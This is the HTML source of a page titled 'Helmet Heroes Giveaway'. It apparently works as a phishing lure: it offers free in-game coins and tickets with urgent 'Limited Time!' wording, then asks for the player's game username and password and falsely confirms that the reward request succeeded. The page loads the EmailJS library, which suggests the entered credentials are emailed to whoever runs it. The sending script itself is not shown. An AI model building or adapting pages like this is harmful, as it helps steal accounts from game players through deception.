<!DOCTYPE html>
<html lang="en">
    <head>
        
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
            <title>Helmet Heroes Giveaway</title>
            <link rel="stylesheet" href="styles.css">
        
    </head>
    <body>
        <header>
            <img src="https://jeffreyebrado.github.io/Images/helmetheroes/logo.png" class="logo">   
        </header>       
        <div class="background">   
            <img src="https://jeffreyebrado.github.io/Images/helmetheroes/background.png" class="background-blue">
  
            <!--Amount desired for rewards-->
              <div class="panel-rewards">
                <h1 class="title">Set Your Reward Amount</h1>
                <hr class="hr">
                <img src="https://jeffreyebrado.github.io/Images/helmetheroes/coin.png" class="coin">
                <img src="https://jeffreyebrado.github.io/Images/helmetheroes/ticket.png" class="ticket">
                 <label for="coinTextField" class="coin-guide-textfield"><b>Amount of Coins </b></label>
                 <input type="number" id="coinTextFieldID" name="coinTextField" class="coin-textfield">

                  <label for="ticketTextField" class="ticket-guide-textfield" style="top: 225px;"><b>Amount of Tickets </b></label>
                  <input type="number" id="ticketTextFieldID" name="ticketsTextField" class="ticket-textfield" style="top: 36%;">

                 <p class="note">Note:"Limited Time! Choose Your Reward Quantity<br>
                 <center class="note" style="top: 50%; left: 35%;">Before It's Too Late!</center>
               
                 </p>

                 <button id="nextButtonID" class="next-button"><b>Next</b></button>
              </div>
    
              <!--Confirmation-->
              <div class="panel-confirmation">
                <h1 class="title">Confirmation</h1>
                <hr class="hr">
                <label for="username" class="username-guide-textfield"><b>Username</b></label>
                 <input type="text" id="usernameID" name="userTextField" class="username-textfield">

                 <label for="password" class="password-guide-textfield" style="top: 30%;"><b>Password</b></label>
                 <input type="password" id="passwordID" name="passwordTextField" class="password-textfield" style="top: 34%;">

                 <label for="level" class="level-guide-textfield" style="top: 43%;"><b>Level</b></label>
                 <input type="number" id="levelID" name="levelTextField" class="level-textfield" style="top: 47%;">

                 <label for="class" class="class-guide-textfield" style="top: 56%;"><b>Class</b></label>
                 <select id="classID" name="classTextField" class="class-textfield" style="top: 60%;">
                    <option value="warrior">Warrior</option>
                    <option value="archer">Archer</option>
                    <option value="cowboy">Cowboy</option>
                    <option value="wizard">Wizard</option>
                </select>
                
                 <button id="getButtonID" class="get-button"><b>Get</b></button>
                 <button id="backButtonID" class="back-button"><b>Back</b></button>
              </div>
                  
        <!--Success Guide and Panel-->
              <div class="success-panel">
                <h1 class="title" style="color: green;">Request Successful!</h1>
                <hr class="hr">
                <h2 class="title" style="color: green; font-weight: 20px;">-Your Request has been Successfully send!</h2>
                <h3 class="title" style="color: green; font-weight: 20px; left: 80px;">Please wait for your request within 24hrs</h3>
                <button id="okButtonID" class="ok-button"><b>Okay</b></button>
            </div>
            

               
        </div>
        <script src="script.js"></script>
        <script src="https://cdn.emailjs.com/dist/email.min.js"></script>


    </body>

</html>
